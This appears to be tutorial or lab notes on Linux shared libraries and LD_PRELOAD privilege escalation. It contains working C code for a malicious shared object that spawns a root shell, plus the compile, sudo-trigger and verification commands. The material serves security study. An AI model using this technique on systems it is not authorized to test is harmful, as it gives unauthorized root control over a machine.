## Background
Linux programs commonly use **dynamically linked shared object libraries** to avoid duplicating code across programs.

### Library Types
| Type | Extension | Behavior |
|---|---|---|
| Static | `.a` | Becomes part of the compiled program — cannot be altered afterward |
| Dynamic (shared object) | `.so` | Loaded at runtime — **can be modified/hijacked** to control program execution |

### How Programs Locate Dynamic Libraries
- `-rpath` / `-rpath-link` compiler flags
- Environment variables: `LD_RUN_PATH`, `LD_LIBRARY_PATH`
- Default directories: `/lib`, `/usr/lib`
- Custom paths defined in `/etc/ld.so.conf`
- **`LD_PRELOAD`** — loads a specified library *before* any others, giving its functions priority over the defaults

**View a binary's required shared objects:**
```bash
ldd /bin/ls
```
```
linux-vdso.so.1 =>  (0x00007fff03bc7000)
libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (...)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (...)
...
```

---

## LD_PRELOAD Privilege Escalation

### Requirements
- A user with `sudo` rights to run **something** as root — even if it's not a known GTFOBin.
- Critically: `LD_PRELOAD` must be preserved through sudo, i.e. `env_keep+=LD_PRELOAD` set in sudoers.

### Step 1 — Confirm sudo rights & env_keep
```bash
sudo -l
```
```
Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=..., env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```
- Even though `apache2` isn't a GTFOBin and the sudoers entry uses an absolute path (normally blocking abuse), the `env_keep+=LD_PRELOAD` setting opens a path.

### Step 2 — Write a malicious shared library
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
- `_init()` runs automatically when the library is loaded.
- Unsets `LD_PRELOAD` (cleanup), sets UID/GID to 0, spawns a root shell.

### Step 3 — Compile it as a shared object
```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

### Step 4 — Trigger via the permitted sudo command
```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

### Step 5 — Confirm root
```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## Key Takeaway
If a sudoers entry preserves `LD_PRELOAD` (`env_keep+=LD_PRELOAD`) for a command a user can run as root — regardless of whether that command is a known GTFOBin — a malicious shared library can be injected via `LD_PRELOAD` to spawn a root shell during that command's execution.